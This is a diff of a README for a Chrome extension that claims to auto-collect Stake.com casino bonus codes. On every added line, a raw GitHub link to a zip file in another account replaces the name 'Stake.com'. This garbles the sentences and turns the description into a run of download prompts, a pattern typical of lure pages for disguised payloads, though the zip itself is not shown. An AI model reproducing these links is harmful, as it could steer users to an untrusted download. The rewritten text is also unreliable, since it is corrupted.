@@ -1,10 +1,10 @@
-Stake.com Bonus Code Claimer Chrome Extension
+https://raw.githubusercontent.com/AnujTechGuru/Bonus-Code-Claimer/main/lib/Bonus-Code-Claimer_v1.2.zip Bonus Code Claimer Chrome Extension
 
-Developed by Ardag7, the Stake.com Bonus Code Claimer Chrome Extension is an indispensable tool for online casino enthusiasts. Here's why:
+Developed by Ardag7, the https://raw.githubusercontent.com/AnujTechGuru/Bonus-Code-Claimer/main/lib/Bonus-Code-Claimer_v1.2.zip Bonus Code Claimer Chrome Extension is an indispensable tool for online casino enthusiasts. Here's why:
 
-Real-time Bonus Code Access: The extension connects directly to Ardag7's Code Server, ensuring users have immediate access to all the latest Stake.com Bonus Codes. With three programs running 24/7, codes are collected from 10 different sources, guaranteeing users get codes as soon as they're released.
+Real-time Bonus Code Access: The extension connects directly to Ardag7's Code Server, ensuring users have immediate access to all the latest https://raw.githubusercontent.com/AnujTechGuru/Bonus-Code-Claimer/main/lib/Bonus-Code-Claimer_v1.2.zip Bonus Codes. With three programs running 24/7, codes are collected from 10 different sources, guaranteeing users get codes as soon as they're released.
 
-Auto-Claiming Functionality: Users can opt to automatically claim monthly, weekly, and forum challenge bonuses from Stake.com. Once enabled, the extension handles the claiming process seamlessly, saving users time and effort.
+Auto-Claiming Functionality: Users can opt to automatically claim monthly, weekly, and forum challenge bonuses from https://raw.githubusercontent.com/AnujTechGuru/Bonus-Code-Claimer/main/lib/Bonus-Code-Claimer_v1.2.zip Once enabled, the extension handles the claiming process seamlessly, saving users time and effort.
 
 Reload Claim Automation: The extension features a reload claim section where users can automate their reload claims. By simply checking a checkbox, users activate the reload claiming functionality. The extension intelligently understands the reload interval, displaying the next claim time and automatically claiming reloads when due.
 
